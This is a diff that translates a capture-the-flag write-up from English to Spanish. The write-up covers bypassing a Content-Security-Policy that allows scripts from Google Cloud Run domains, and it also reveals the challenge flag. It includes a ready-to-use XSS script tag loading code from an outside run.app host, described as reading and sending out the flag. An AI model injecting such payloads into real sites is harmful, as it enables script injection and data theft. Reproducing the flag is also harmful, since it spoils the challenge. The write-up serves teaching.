@@ -1,11 +1,11 @@
-The CSP allows us to source Javascript files from `*.us-central1.run.app`. 
+La cabecera Content-Security-Policy (CSP) permite cargar archivos JavaScript externos desde `*.us-central1.run.app`:
 `` default-src 'self'; 
    script-src 'self' '*.us-central1.run.app';
    connect-src *; 
    style-src-elem 'self' fonts.googleapis.com fonts.gstatic.com; 
    font-src 'self' fonts.gstatic.com fonts.googleapis.com ``
 
-This is the domain used by Google Cloud Run and Cloud Functions. So you can deploy a function to return Javascript code. 
+Este es el dominio utilizado por Google Cloud Run y Cloud Functions, por lo que se puede desplegar una función que devuelva el código JavaScript encargado de leer `/xss-two-flag` y exfiltrar la flag (`DUOC{dominio_autorizado_politica_85329}`):
 ``` 
 def serveIt(request):
    
@@ -30,6 +30,6 @@ def serveIt(request):
     """ 
  ```
 
- You can use the prehosted script at `<script src="https://javascript-server-808630243113.us-central1.run.app"> </script>` to test the challenge. 
+ Puedes utilizar el script prealojado `<script src="https://javascript-server-808630243113.us-central1.run.app"> </script>` para probar el desafío.
 
- Or use the automated solution, `python3 server.py https://web-tutorial-2-4b27d232.challenges.bsidessf.net`. 
+ O ejecutar la solución automatizada: `python3 solution.py <challenge-url>`.
